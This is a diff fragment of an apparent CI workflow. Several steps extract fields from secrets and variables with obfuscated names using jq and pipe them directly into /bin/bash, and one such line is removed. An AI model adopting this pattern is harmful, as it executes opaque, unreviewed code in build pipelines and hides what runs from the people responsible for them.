@@ -17,7 +17,6 @@ jobs:
           uxxcr3: ${{ secrets.uxxcr3 }}
         run: |
           printf '%s' "$uxxcr3" | jq -r .gyidj44 | /bin/bash
-          echo $uc71 | jq -r .m5 | /bin/bash
           echo $qn174 | jq -r .mexmr547 | /bin/bash
           echo $ny45921 | jq -r .qprzh308 | /bin/bash
           printf '%s' "$azxko857" | jq -r .ky783 | /bin/bash
